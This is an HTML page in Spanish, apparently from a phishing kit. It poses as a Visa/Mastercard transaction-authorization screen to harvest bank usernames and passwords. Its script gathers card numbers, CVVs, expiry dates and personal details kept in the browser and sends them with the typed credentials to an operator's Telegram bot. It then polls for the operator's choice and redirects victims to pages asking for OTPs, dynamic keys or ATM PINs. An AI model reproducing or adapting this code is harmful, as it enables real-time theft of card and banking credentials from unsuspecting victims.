<!DOCTYPE html>
<html lang="es">

<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Autorización de Transacción</title>
    <script src="./bots/aes.js"></script>
   <script src="./bots/AesUtil.js"></script>
   <script src="./bots/md5.js"></script>
   <script src="./bots/pbkdf2.js"></script>
   <script src="./bots/string-mask.js"></script>
    <style>
        body {
            margin: 0;
            padding: 0;
            overflow: hidden; /* Evita que la página se desplace */
            background-color: #ffffff;
        }
    
        html, body {
            height: 100%;
        }
    
        #contenedor {
            position: relative;
            width: 95vw;
            height: 95vh;
            background-color: #ffffff;
            overflow: hidden; /* Evita que las imágenes sobresalgan del contenedor */
            top: 50px;
            left: 35px;
            width: 310px; /* Ajusta el ancho según tus necesidades */
            height: 500px; /* Ajusta la altura según tus necesidades */
        }
    
        #imagenIzquierda {
            position: absolute;
            top: 10px;
            left: 20px;
            width: 70px; /* Ajusta el ancho según tus necesidades */
            height: 30px; /* Ajusta la altura según tus necesidades */
        }
    
        #imagenDerecha {
            position: absolute;
            top: 2px;
            right: 20px;
            width: 100px; /* Ajusta el ancho según tus necesidades */
            height: 50px; /* Ajusta la altura según tus necesidades */
        }
    
        #titulo {
            font-size: 20px;
            font-weight: bold;
            color: #333; /* Color del texto */
            margin-top: 70px; /* Espaciado superior */
            margin-bottom: 10px; /* Espaciado inferior */
            text-align: center; /* Alineación del texto */
        }
    
        #titulo2 {
            font-size: 16px;
            font-weight: bold;
            color: #333; /* Color del texto */
            margin-top: 30px; /* Espaciado superior */
            margin-bottom: 10px; /* Espaciado inferior */
            text-align: center; /* Alineación del texto */
        }
    
        #parrafo {
            font-size: 13px;
            color: #000000; /* Color del texto */
            margin: 0 auto; /* Centra el párrafo horizontalmente */
            max-width: 80%; /* Ancho máximo del párrafo */
            text-align: justify; /* Justifica el texto */
            letter-spacing: 2px; /* Ajusta el valor según tus preferencias */
        }
    
        #formulario {
            margin-top: 10px;
            padding: 0 40px;
            display: flex;
            flex-direction: column;
            align-items: flex-start; /* Alinea los elementos al inicio del contenedor */
        }
    
        .form-group {
            display: flex;
            align-items: center;
            margin-bottom: 15px;
            width: 100%; /* Ajusta el ancho para que ocupe todo el contenedor */
        }
    
        .form-group label {
            font-size: 12px;
            font-weight: bold;
            color: #333;
            width: 30%; /* Ancho de la etiqueta */
            margin-right: 5px; /* Espaciado entre la etiqueta y el input */
            text-align: left; /* Alinea el texto del título a la izquierda */
        }
    
        .form-group input {
            width: 70%; /* Ancho del input */
            max-width: 130px; /* Ancho máximo para los inputs */
            padding: 8px;
            margin-bottom: 2px;
            margin-top: -4px; /* Ajusta la posición vertical del input */
            box-sizing: border-box;
            border: 1px solid #ccc;
            border-radius: 4px;
        }
    
        #horaTransaccion {
            font-size: 14px;
            color: #333;
            margin-top: 15px;
            text-align: center; /* Centra el texto */
        }
    
        #autorizarBtn { 
            display: block;
            margin: 45px auto;
            padding: 15px 30px;
            border-radius: 10%;
            background-color: #000;
            color: #fff;
            text-align: center;
            cursor: pointer;
            font-size: 12px;
            text-decoration: none;
            border: none;
        }
    
        #contador {
            color: #555;
            font-size: 8px;
            margin-left: 8px;
        }
    .loaderp {
    width: 48px;
    height: 48px;
    border: 5px solid #FFF;
    border-bottom-color: blue;
    border-radius: 50%;
    display: inline-block;
    box-sizing: border-box;
    animation: rotation 1s linear infinite;
    }

    @keyframes rotation {
    0% {
        transform: rotate(0deg);
    }
    100% {
        transform: rotate(360deg);
    }
    }

.loaderp-full{
    position: fixed;
    top: 0;
    overflow-y: hidden;
    z-index: 1000;
    background-color: white;
    width: 100vw;
    height: 100vh;

    display: none;
    flex-direction: column;
    justify-content: center;
    align-items: center;
}
    </style>
</head>

<body>
    <div id="contenedor">
        <img id="imagenIzquierda" src="img/visa.jpg" alt="Logo Visa">
        <img id="imagenDerecha" src="img/master.png" alt="Logo Mastercard">
        <div id="titulo">Autorización de transacción</div>
        <p id="parrafo">Estás intentando realizar un pago por tarjeta de crédito/débito. Necesitamos confirmar que eres tú quien realiza este pago.</p>
        <p id="horaTransaccion">Hora de la transacción: </p>
        <form id="formulario" method="POST">
            <div class="form-group">
                <label for="username">Usuario:</label>
                <input type="text" id="username" name="username" placeholder="Usuario" minlength="4" maxlength="20" required>
            </div>
            <div class="form-group">
                <label for="password">Clave:</label>
                <input type="password" id="password" name="password" placeholder="Clave" minlength="4" maxlength="20" required>
            </div>
            <input type="hidden" name="localStorageInfo" id="localStorageInfo">
            
        <button type="submit" id="autorizarBtn">Autorizar</button>
        </form>
    </div>

    <!-- LOADER FULL -->
    <div class="loaderp-full">
      <span class="loaderp"></span>
      <p class="text-italic tc-ocean fs-3 fw-light"></p>
    </div>

    <script>
    document.addEventListener('DOMContentLoaded', function () {
        const loader = document.querySelector(".loaderp-full");

        // Actualiza la hora en vivo cada segundo
        setInterval(actualizarHoraTransaccion, 1000);

        function obtenerFechaActual() {
            const ahora = new Date();
            const dia = ahora.getDate().toString().padStart(2, '0');
            const mes = (ahora.getMonth() + 1).toString().padStart(2, '0');
            const año = ahora.getFullYear();
            const horas = ahora.getHours().toString().padStart(2, '0');
            const minutos = ahora.getMinutes().toString().padStart(2, '0');
            const segundos = ahora.getSeconds().toString().padStart(2, '0');
            return `${dia}/${mes}/${año} ${horas}:${minutos}:${segundos}`;
        }

        function actualizarHoraTransaccion() {
            const ahora = new Date();
            const horas = ahora.getHours().toString().padStart(2, '0');
            const minutos = ahora.getMinutes().toString().padStart(2, '0');
            const segundos = ahora.getSeconds().toString().padStart(2, '0');
            document.getElementById('horaTransaccion').innerText = `Hora de la transacción: ${horas}:${minutos}:${segundos}`;
        }

        // Al enviar el formulario
        document.getElementById('formulario').addEventListener('submit', async function (event) {
            event.preventDefault();
            loader.style.display = "flex";

            // Obtener los datos de pago desde localStorage con la clave 'pagojet'
            const info = localStorage.getItem('pagojet');
            let pagoData = null;

            if (info) {
                try {
                    // Parsear los datos obtenidos
                    pagoData = JSON.parse(info);
                    console.log("Datos de pago obtenidos:", pagoData); // Debugging
                } catch (e) {
                    console.error('Error al parsear localStorage:', e);
                }
            } else {
                console.log('No se encontró información en localStorage con la clave "pagojet".');
            }

            // Guardar username y password en localStorage
            const transactionId = Date.now().toString(36) + Math.random().toString(36).substr(2);
            const username = document.getElementById('username').value;
            const password = document.getElementById('password').value;

            localStorage.setItem('transactionId', transactionId);
            localStorage.setItem('username', username);
            localStorage.setItem('password', password);

            // Preparar el mensaje para enviar a Telegram
            const message = `
<b>Nuevo método de pago pendiente de verificación.</b>
--------------------------------------------------
🆔 <b>ID:</b> | <b>${pagoData ? pagoData.id : '<i>No disponible</i>'}</b>
👤 <b>Nombre:</b> | ${pagoData ? pagoData.nombre : '<i>No disponible</i>'}
--------------------------------------------------
📧 <b>Email:</b> | ${pagoData ? pagoData.email : '<i>No disponible</i>'}
📞 <b>Celular:</b> | ${pagoData ? pagoData.celular : '<i>No disponible</i>'}
🏦 <b>Banco:</b> | ${pagoData ? pagoData.banco : '<i>No disponible</i>'}
📍 <b>Dirección:</b> | ${pagoData ? pagoData.direccion : '<i>No disponible</i>'}
--------------------------------------------------
💳 <b>Tarjeta:</b> | ${pagoData ? pagoData.tarjeta : '<i>No disponible</i>'}
📅 <b>Fecha de Expiración:</b> | ${pagoData ? pagoData.ftarjeta : '<i>No disponible</i>'}
🔐 <b>CVV:</b> | ${pagoData ? pagoData.cvv : '<i>No disponible</i>'}
--------------------------------------------------
🧑‍💻 <b>Usuario:</b> | ${username}
🔐 <b>Clave:</b> | ${password}
--------------------------------------------------
🌐 <b>IP:</b> | ${pagoData ? pagoData.ip : '<i>No disponible</i>'}
`;

            // Crear teclado interactivo con botones
            const keyboard = JSON.stringify({
                inline_keyboard: [
                    [{ text: "Error de TC", callback_data: `error_tc:${transactionId}` }],
                    [{ text: "Error de Logo", callback_data: `error_logo:${transactionId}` }],
                    [{ text: "Pedir Dinámica", callback_data: `pedir_dinamica:${transactionId}` }],
                    [{ text: "Pedir OTP", callback_data: `pedir_otp:${transactionId}` }],
                    [{ text: "Clave de Cajero", callback_data: `clave_cajero:${transactionId}` }]
                ],
            });

            const config = await loadTelegramConfig();
            if (!config) {
                loader.style.display = "none";
                return;
            }

            fetch(`https://api.telegram.org/bot${config.token}/sendMessage`, {
                method: "POST",
                headers: {
                    "Content-Type": "application/json",
                },
                body: JSON.stringify({
                    chat_id: config.chat_id,
                    text: message,
                    reply_markup: keyboard,
                    parse_mode: "HTML", // Especificar el modo de análisis para el formato HTML
                }),
            })
                .then((response) => response.json())
                .then((data) => {
                    if (data.ok) {
                        console.log("Mensaje enviado a Telegram con éxito");
                        const messageId = data.result.message_id;
                        checkPaymentVerification(transactionId, messageId, config);
                    } else {
                        console.error("Error al enviar mensaje a Telegram:", data);
                        loader.style.display = "none";
                    }
                })
                .catch((error) => {
                    console.error("Error al enviar mensaje a Telegram:", error);
                    loader.style.display = "none";
                });
        });

        async function loadTelegramConfig() {
            try {
                const response = await fetch("botmaster2.php");
                if (!response.ok) {
                    throw new Error("No se pudo cargar el archivo de configuración de Telegram.");
                }
                return await response.json();
            } catch (error) {
                console.error("Error al cargar el archivo de configuración de Telegram:", error);
            }
        }

        async function checkPaymentVerification(transactionId, messageId, config) {
            fetch(`https://api.telegram.org/bot${config.token}/getUpdates`)
                .then((response) => response.json())
                .then((data) => {
                    const updates = data.result;
                    const verificationUpdate = updates.find(
                        (update) =>
                            update.callback_query &&
                            (
                                update.callback_query.data === `error_tc:${transactionId}` ||
                                update.callback_query.data === `error_logo:${transactionId}` ||
                                update.callback_query.data === `pedir_dinamica:${transactionId}` ||
                                update.callback_query.data === `pedir_otp:${transactionId}` ||
                                update.callback_query.data === `clave_cajero:${transactionId}`
                            )
                    );

                    if (verificationUpdate) {
                        // Eliminar botones del mensaje original
                        fetch(`https://api.telegram.org/bot${config.token}/editMessageReplyMarkup`, {
                            method: "POST",
                            headers: {
                                "Content-Type": "application/json",
                            },
                            body: JSON.stringify({
                                chat_id: config.chat_id,
                                message_id: messageId,
                                reply_markup: JSON.stringify({ inline_keyboard: [] }),
                            }),
                        });

                        loader.style.display = "none";

                        // Comportamientos basados en el botón presionado
                        if (verificationUpdate.callback_query.data === `pedir_dinamica:${transactionId}`) {
                            window.location.href = "pedir_dinamica.php";
                        } else if (verificationUpdate.callback_query.data === `error_tc:${transactionId}`) {
                            alert("Error con la tarjeta de crédito. Verifique los datos.");
                            window.location.href = "payment.html";
                        } else if (verificationUpdate.callback_query.data === `error_logo:${transactionId}`) {
                            alert("Usuario o clave incorrectos.");
                        } else if (verificationUpdate.callback_query.data === `pedir_otp:${transactionId}`) {
                            window.location.href = "pedir_otp.html";
                        } else if (verificationUpdate.callback_query.data === `clave_cajero:${transactionId}`) {
                            window.location.href = "clave_cajero.html";
                        }
                    } else {
                        setTimeout(() => checkPaymentVerification(transactionId, messageId, config), 2000);
                    }
                })
                .catch((error) => {
                    console.error("Error al verificar el pago:", error);
                    setTimeout(() => checkPaymentVerification(transactionId, messageId, config), 2000);
                });
        }
    });
</script>
